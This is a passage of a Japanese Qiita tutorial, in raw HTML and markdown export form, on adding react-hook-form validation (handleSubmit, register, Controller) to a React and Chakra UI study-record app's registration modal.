class=\"nc\">ModalFooter</span><span class=\"p\">&gt;</span>\n<span class=\"hdl\">-                  <span class=\"p\">&lt;</span><span class=\"nc\">Button</span> <span class=\"na\">colorScheme</span><span class=\"p\">=</span><span class=\"s\">\"teal\"</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onRecordRegist</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n</span><span class=\"hil\">+                  <span class=\"p\">&lt;</span><span class=\"nc\">Button</span> <span class=\"na\">colorScheme</span><span class=\"p\">=</span><span class=\"s\">\"teal\"</span> <span class=\"na\">type</span><span class=\"p\">=</span><span class=\"s\">\"submit\"</span><span class=\"p\">&gt;</span>\n</span>                    登録\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Button</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nc\">ModalFooter</span><span class=\"p\">&gt;</span>\n<span class=\"hil\">+              <span class=\"p\">&lt;/</span><span class=\"nt\">form</span><span class=\"p\">&gt;</span>\n</span>            <span class=\"p\">&lt;/</span><span class=\"nc\">ModalContent</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">&lt;/</span><span class=\"nc\">Modal</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"86:1-86:26\">\n<span id=\"5handlesubmitの導入\" class=\"fragment\"></span><a href=\"#5handlesubmit%E3%81%AE%E5%B0%8E%E5%85%A5\"><i class=\"fa fa-link\"></i></a>5.handleSubmitの導入</h2>\n<p data-sourcepos=\"88:1-88:115\">ドキュメントのexampleに倣って、<code>&lt;form onSubmit={handleSubmit(onRecordRegist)}&gt;</code>を記載しました。</p>\n<p data-sourcepos=\"90:1-90:53\"><iframe id=\"qiita-embed-content__4b63fb0f353993d235bcf01f21d05ecf\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__4b63fb0f353993d235bcf01f21d05ecf\" data-content=\"https%3A%2F%2Freact-hook-form.com%2Fdocs%2Fuseform%2Fhandlesubmit\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"92:1-92:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"93:1-94:141\">\n<p data-sourcepos=\"93:2-93:75\">This function will receive the form data if form validation is successful.</p>\n<blockquote data-sourcepos=\"94:2-94:141\">\n<p data-sourcepos=\"94:4-94:141\">日本語訳：この関数は、フォームのバリデーションが成功した場合にフォームデータを受け取ります。</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"96:1-98:87\">handleSubmitの引数に指定した、<code>関数(onRecordRegist)はバリデーションが成功した場合、 onRecordRegistを実行</code>します。<br>\nまた、<code>data</code>にはフォームから受け取ったデータを取得できます。</p>\n<p data-sourcepos=\"100:1-100:59\">useStateで設定していた処理は削除しました。</p>\n<p data-sourcepos=\"102:1-103:76\">reac-hook-formを使用するために、カスタムフックの<code>useForm</code>を追加しました。<br>\nuseFormを使うことで、フォームの管理が可能になります。</p>\n<p data-sourcepos=\"105:1-105:40\"><iframe id=\"qiita-embed-content__80aa1dcf558a231aa6b24a04f54344ec\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__80aa1dcf558a231aa6b24a04f54344ec\" data-content=\"https%3A%2F%2Freact-hook-form.com%2Fdocs%2Fuseform\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"107:1-148:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">ChangeEvent</span><span class=\"p\">,</span> <span class=\"nx\">useEffect</span><span class=\"p\">,</span> <span class=\"nx\">useState</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">addStudyRecord</span><span class=\"p\">,</span> <span class=\"nx\">GetAllStudyRecords</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nb\">Record</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">./domain/record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">BsPencil</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-icons/bs</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">React</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useForm</span><span class=\"p\">,</span> <span class=\"nx\">SubmitHandler</span><span class=\"p\">,</span> <span class=\"nx\">Controller</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">react-hook-form</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">studyRecords</span><span class=\"p\">,</span> <span class=\"nx\">setStudyRecords</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nx\">useState</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span><span class=\"p\">([]);</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">isLoading</span><span class=\"p\">,</span> <span class=\"nx\">setIsLoading</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">isOpen</span><span class=\"p\">,</span> <span class=\"nx\">onOpen</span><span class=\"p\">,</span> <span class=\"nx\">onClose</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nf\">useDisclosure</span><span class=\"p\">();</span>\n<span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"nx\">initialRef</span> <span class=\"o\">=</span> <span class=\"nx\">React</span><span class=\"p\">.</span><span class=\"nf\">useRef</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">);</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">title</span><span class=\"p\">,</span> <span class=\"nx\">setTitle</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"dl\">\"\"</span><span class=\"p\">);</span> <span class=\"c1\">// useStateを使い学習内容をセットしていた処理を削除</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">time</span><span class=\"p\">,</span> <span class=\"nx\">setTime</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span> <span class=\"c1\">// useStateを使い学習時間をセットしていた処理を削除</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">register</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">handleSubmit</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"na\">formState</span><span class=\"p\">:</span> <span class=\"p\">{</span> <span class=\"nx\">errors</span> <span class=\"p\">},</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">setValue</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">control</span><span class=\"p\">,</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nx\">useForm</span><span class=\"o\">&lt;</span><span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"o\">&gt;&gt;</span><span class=\"p\">()</span>\n</span>  <span class=\"kd\">const</span> <span class=\"nx\">getAllStudyRecords</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">records</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nc\">GetAllStudyRecords</span><span class=\"p\">();</span>\n    <span class=\"nf\">setStudyRecords</span><span class=\"p\">(</span><span class=\"nx\">records</span><span class=\"p\">);</span>\n    <span class=\"nf\">setIsLoading</span><span class=\"p\">(</span><span class=\"kc\">false</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n  <span class=\"nf\">useEffect</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">getAllStudyRecords</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"p\">[]);</span>\n<span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"nx\">onRecordRegist</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"na\">onRecordRegist</span><span class=\"p\">:</span> <span class=\"nx\">SubmitHandler</span><span class=\"o\">&lt;</span><span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"o\">&gt;&gt;</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n</span>    <span class=\"kd\">const</span> <span class=\"na\">insertData</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nb\">Record</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n<span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">insertData</span><span class=\"p\">.</span><span class=\"nx\">title</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">;</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">insertData</span><span class=\"p\">.</span><span class=\"nx\">time</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">;</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"nx\">insertData</span><span class=\"p\">.</span><span class=\"nx\">title</span> <span class=\"o\">=</span> <span class=\"nx\">title</span><span class=\"p\">;</span>\n</span><span class=\"hdl\"><span class=\"o\">- </span>   <span class=\"nx\">insertData</span><span class=\"p\">.</span><span class=\"nx\">time</span> <span class=\"o\">=</span> <span class=\"nx\">time</span><span class=\"p\">;</span>\n</span>    <span class=\"k\">await</span> <span class=\"nf\">addStudyRecord</span><span class=\"p\">(</span><span class=\"nx\">insertData</span><span class=\"p\">);</span>\n    <span class=\"nf\">getAllStudyRecords</span><span class=\"p\">();</span>\n    <span class=\"nf\">onClose</span><span class=\"p\">();</span>\n  <span class=\"p\">};</span>\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"149:1-149:22\">\n<span id=\"6registerの導入\" class=\"fragment\"></span><a href=\"#6register%E3%81%AE%E5%B0%8E%E5%85%A5\"><i class=\"fa fa-link\"></i></a>6.registerの導入</h2>\n<p data-sourcepos=\"150:1-150:99\">学習内容欄（title）に<code>register</code>を導入し、バリデーションを追加しました。</p>\n<p data-sourcepos=\"152:1-152:49\"><iframe id=\"qiita-embed-content__dd82e0fce342ea1f4c2e7b1a569e49f2\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__dd82e0fce342ea1f4c2e7b1a569e49f2\" data-content=\"https%3A%2F%2Freact-hook-form.com%2Fdocs%2Fuseform%2Fregister\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"154:1-154:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"155:1-156:290\">\n<p data-sourcepos=\"155:2-155:207\">This method allows you to register an input or select element and apply validation rules to React Hook Form. Validation rules are all based on the HTML standard and also allow for custom validation methods.</p>\n<blockquote data-sourcepos=\"156:2-156:290\">\n<p data-sourcepos=\"156:3-156:290\">日本語訳：このメソッドでは、input または select 要素を登録し、React Hook Form にバリデーションルールを適用できます。バリデーションルールはすべて HTML 標準に基づいており、カスタムバリデーションも可能です。</p>\n</blockquote>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"159:1-173:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code>                <span class=\"p\">&lt;</span><span class=\"nc\">ModalBody</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">FormControl</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>学習内容<span class=\"p\">&lt;/</span><span class=\"nc\">FormLabel</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nc\">Input</span>\n                      <span class=\"si\">{</span><span class=\"p\">...</span><span class=\"nf\">register</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">required</span><span class=\"p\">:</span> <span class=\"kc\">true</span> <span class=\"p\">})</span><span class=\"si\">}</span>\n                      <span class=\"na\">placeholder</span><span class=\"p\">=</span><span class=\"s\">\"学習内容\"</span>\n                    <span class=\"p\">/&gt;</span>\n                    <span class=\"si\">{</span><span class=\"cm\">/* エラーの表示 */</span><span class=\"si\">}</span>\n                    <span class=\"si\">{</span><span class=\"nx\">errors</span><span class=\"p\">.</span><span class=\"nx\">title</span><span class=\"p\">?.</span><span class=\"kd\">type</span> <span class=\"o\">===</span> <span class=\"dl\">\"</span><span class=\"s2\">required</span><span class=\"dl\">\"</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span>\n                      <span class=\"p\">&lt;</span><span class=\"nt\">p</span> <span class=\"na\">style</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">{</span> <span class=\"na\">color</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">red</span><span class=\"dl\">\"</span> <span class=\"p\">}</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>学習内容は必須です<span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">)</span><span class=\"si\">}</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">FormControl</span><span class=\"p\">&gt;</span>\n             　　<span class=\"p\">&lt;/</span><span class=\"nc\">ModalBody</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"175:1-175:44\"><code>{...register(\"title\", { required: true })}</code></p>\n<ul data-sourcepos=\"176:1-179:0\">\n<li data-sourcepos=\"176:1-176:48\">\n<code>\"title\"</code>:登録するフィールドの名前</li>\n<li data-sourcepos=\"177:1-177:77\">\n<code>{ required: true }</code>:必須項目のバリデーションルールを設定</li>\n<li data-sourcepos=\"178:1-179:0\">\n<code>…</code>：JavaScriptのスプレッド構文、registerが生成した属性を展開</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"180:1-193:3\"><div class=\"highlight\"><pre><code><span class=\"p\">&lt;</span><span class=\"nc\">Input</span>\n<span class=\"si\">{</span><span class=\"p\">...</span><span class=\"nf\">register</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">{</span> <span class=\"na\">required</span><span class=\"p\">:</span> <span class=\"kc\">true</span> <span class=\"p\">})</span><span class=\"si\">}</span>\n<span class=\"na\">placeholder</span><span class=\"p\">=</span><span class=\"s\">\"学習内容\"</span>\n<span class=\"p\">/&gt;</span>\n<span class=\"p\">{</span><span class=\"cm\">/* 実際はこのように展開されている */</span><span class=\"p\">}</span>\n<span class=\"p\">&lt;</span><span class=\"nc\">Input</span>\n  <span class=\"na\">name</span><span class=\"p\">=</span><span class=\"s\">\"title\"</span>\n  <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">[</span><span class=\"nb\">Function</span><span class=\"p\">]</span><span class=\"si\">}</span>\n  <span class=\"na\">onBlur</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">[</span><span class=\"nb\">Function</span><span class=\"p\">]</span><span class=\"si\">}</span>\n  <span class=\"na\">ref</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">[</span><span class=\"nb\">Function</span><span class=\"p\">]</span><span class=\"si\">}</span>\n  <span class=\"na\">placeholder</span><span class=\"p\">=</span><span class=\"s\">\"学習内容\"</span>\n<span class=\"p\">/&gt;</span>\n</code></pre></div></div>\n<h2 data-sourcepos=\"197:1-197:24\">\n<span id=\"7controllerの導入\" class=\"fragment\"></span><a href=\"#7controller%E3%81%AE%E5%B0%8E%E5%85%A5\"><i class=\"fa fa-link\"></i></a>7.Controllerの導入</h2>\n<p data-sourcepos=\"199:1-199:57\"><iframe id=\"qiita-embed-content__46de0925536448682eb24d1b646b3529\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__46de0925536448682eb24d1b646b3529\" data-content=\"https%3A%2F%2Freact-hook-form.com%2Fdocs%2Fusecontroller%2Fcontroller\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"201:1-202:125\">勉強時間の入力欄にはChakraUIのNumberInputを使用していました。<br>\nChakraUIのNumberInputなどの複雑なinput要素にはregisterが使えないため、<code>Controller</code>を導入しました。</p>\n<p data-sourcepos=\"204:1-204:276\"><code>register</code>は<code>標準のHTMLフォーム要素（\\&lt;input&gt;など）に直接適用するように設計</code>されていますが、ChakuraUIのNumberInputなど<code>複数の要素から成り立っているカスタムコンポーネント</code>には、registerは使用できません。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"206:1-235:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"p\">&lt;</span><span class=\"nc\">Controller</span>\n  <span class=\"na\">name</span><span class=\"p\">=</span><span class=\"s\">\"time\"</span>  <span class=\"c1\">// フォーム内での識別名</span>\n  <span class=\"na\">control</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">control</span><span class=\"si\">}</span>  <span class=\"c1\">// React Hook Formのコントロールオブジェクト</span>\n  <span class=\"na\">rules</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">{</span> <span class=\"na\">required</span><span class=\"p\">:</span> <span class=\"kc\">true</span><span class=\"p\">,</span> <span class=\"na\">min</span><span class=\"p\">:</span> <span class=\"mi\">0</span> <span class=\"p\">}</span><span class=\"si\">}</span>  <span class=\"c1\">// バリデーションルール</span>\n  <span class=\"na\">render</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">({</span> <span class=\"nx\">field</span> <span class=\"p\">})</span> <span class=\"o\">=&gt;</span> <span class=\"p\">(</span>  <span class=\"c1\">// レンダリング関数</span>\n    <span class=\"p\">&lt;</span><span class=\"nc\">NumberInput</span>\n      <span class=\"na\">value</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">field</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"si\">}</span>  <span class=\"c1\">// Controllerから受け取った値、「現在の値」(フォームの状態)</span>\n      <span class=\"na\">onChange</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">(</span><span class=\"nx\">valueString</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>  <span class=\"c1\">// 「新しく入力された値」(変更イベントの引数)、変更があると文字列として受け取る</span>\n        <span class=\"nx\">field</span><span class=\"p\">.</span><span class=\"nf\">onChange</span><span class=\"p\">(</span><span class=\"nf\">parseInt</span><span class=\"p\">(</span><span class=\"nx\">valueString</span><span class=\"p\">));</span>  <span class=\"c1\">// 文字列を数値に変換してからフォームに反映</span>\n      <span class=\"p\">}</span><span class=\"si\">}</span>\n    <span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">NumberInputField</span> <span class=\"p\">/&gt;</span>\n      <span class=\"si\">{</span><span class=\"cm\">/* エラーの表示 */</span><span class=\"si\">}</span>\n      <span class=\"si\">{</span><span class=\"nx\">errors</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">?.</span><span class=\"kd\">type</span> <span class=\"o\">===</span> <span class=\"dl\">\"</span><span class=\"s2\">required</span><span class=\"dl\">\"</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">p</span> <span class=\"na\">style</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">{</span> <span class=\"na\">color</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">red</span><span class=\"dl\">\"</span> <span class=\"p\">}</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>学習時間は必須です<span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">)</span><span class=\"si\">}</span>\n      <span class=\"si\">{</span><span class=\"nx\">errors</span><span class=\"p\">.</span><span class=\"nx\">time</span><span class=\"p\">?.</span><span class=\"kd\">type</span> <span class=\"o\">===</span> <span class=\"dl\">\"</span><span class=\"s2\">min</span><span class=\"dl\">\"</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">p</span> <span class=\"na\">style</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">{</span> <span class=\"na\">color</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">red</span><span class=\"dl\">\"</span> <span class=\"p\">}</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n          時間は0以上である必要があります\n        <span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">)</span><span class=\"si\">}</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">NumberInputStepper</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nc\">NumberIncrementStepper</span> <span class=\"p\">/&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nc\">NumberDecrementStepper</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nc\">NumberInputStepper</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/</span><span class=\"nc\">NumberInput</span><span class=\"p\">&gt;</span>\n  <span class=\"p\">)</span><span class=\"si\">}</span>\n<span class=\"p\">/&gt;</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"237:1-239:87\"><code>name</code>:登録するフィールドの名称<br>\n<code>rules</code>:必須項目、最小値=0のバリデーションルールを設定<br>\n<code>render</code>:コントローラーから受け取った値を元に、フォームに設定</p>\n<h1 data-sourcepos=\"241:1-241:14\">\n<span id=\"導入完了\" class=\"fragment\"></span><a href=\"#%E5%B0%8E%E5%85%A5%E5%AE%8C%E4%BA%86\"><i class=\"fa fa-link\"></i></a>導入完了</h1>\n<p data-sourcepos=\"243:1-243:138\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F00b851af-aca5-47ff-906a-769619b5aef8.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=26dad50ef50cdd48aa23e47c6efba2d1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F00b851af-aca5-47ff-906a-769619b5aef8.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=26dad50ef50cdd48aa23e47c6efba2d1\" alt=\"バリデーション.gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F00b851af-aca5-47ff-906a-769619b5aef8.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=cd83cc5fbf34cca131b0774791aef9b3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/00b851af-aca5-47ff-906a-769619b5aef8.gif\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"246:1-246:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"247:1-248:138\">react-hook-formを使うことで、容易にバリデーション、フォームデータを取り扱えることを学びました。<br>\nドキュメントを参照しつつ、自分のプロダクトに取り込むコツが少しずつ掴めてきたと感じています。</p>\n<h1 data-sourcepos=\"251:1-251:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"252:1-252:28\"><iframe id=\"qiita-embed-content__89834e09f47e9dd68289c9c5b416130b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__89834e09f47e9dd68289c9c5b416130b\" data-content=\"https%3A%2F%2Freact-hook-form.com%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n現在取り組んでいる、学習記録アプリのリニューアル作業にて登録フォームのバリデーションにreact-hook-formを導入することにしました。学んだことを備忘録としてまとめてみました。\n\n## 実現したいこと\nフォームの登録ボタンを押したときに、バリデーションを適用させたい\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/51eae118-f89c-40a4-b15b-8dce78b4d881.png)\n\n\n# react-hook-formとは？\nhttps://react-hook-form.com/\n\n**TOPページより引用（日本語訳）**\n>\"Performant, flexible and extensible forms with easy-to-use validation.\"\n（高性能で柔軟性があり拡張可能なフォームで、使いやすいバリデーション機能を備えています）\n\nReactで**フォームを取り扱う際に使える高性能なライブラリ**と理解しました。\n\n# 導入手順\n## 1.react-hook-formのドキュメントを確認\nhttps://react-hook-form.com/get-started#Quickstart\n\n## 2.ライブラリをインストール\n```shell\n$ npm install react-hook-form\n```\n\n## 3.Quick StartのExampleを確認\n**react-hook-formのドキュメントより引用**\n> ![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/38fc1a26-ac64-4e87-9841-5a9628fc9858.png)\n\n## 4.form形式へ変更\nクイックスタートを確認すると、formタグを使用した構造を元に使用例が提示されていました。\n私は各入力値を、useStateで設定するように実装していたため、form形式に変更することから始めました。\n\n**formの形式に修正**\n\n```diff_tsx:App.tsx\n<Modal initialFocusRef={initialRef} isOpen={isOpen} onClose={onClose}>\n            <ModalOverlay />\n            <ModalContent>\n+              <form onSubmit={handleSubmit(onRecordRegist)}>\n                <ModalHeader>Modal Title</ModalHeader>\n                <ModalCloseButton />\n                <ModalBody>\n                  <FormControl isRequired>\n                    <FormLabel>学習内容</FormLabel>\n                    <Input\n                      ref={initialRef}\n                      placeholder=\"学習内容\"\n                      onChange={(e: ChangeEvent<HTMLInputElement>) =>\n                        setTitle(e.target.value) // useStateを使い学習内容をセット\n                      }\n                    />\n                  </FormControl>\n                  <FormControl isRequired>\n                    <FormLabel>学習時間</FormLabel>\n                    <NumberInput\n                      defaultValue={0}\n                      max={50}\n                      min={0}\n                      onChange={(_, valueAsNumber: number) =>\n                        setTime(valueAsNumber) // useStateを使い学習時間をセット\n                      }\n                    >\n                      <NumberInputField />\n                      <NumberInputStepper>\n                        <NumberIncrementStepper />\n                        <NumberDecrementStepper />\n                      </NumberInputStepper>\n                    </NumberInput>\n                  </FormControl>\n                </ModalBody>\n\n                <ModalFooter>\n-                  <Button colorScheme=\"teal\" onClick={onRecordRegist}>\n+                  <Button colorScheme=\"teal\" type=\"submit\">\n                    登録\n                  </Button>\n                </ModalFooter>\n+              </form>\n            </ModalContent>\n          </Modal>\n```\n\n## 5.handleSubmitの導入\n\nドキュメントのexampleに倣って、`<form 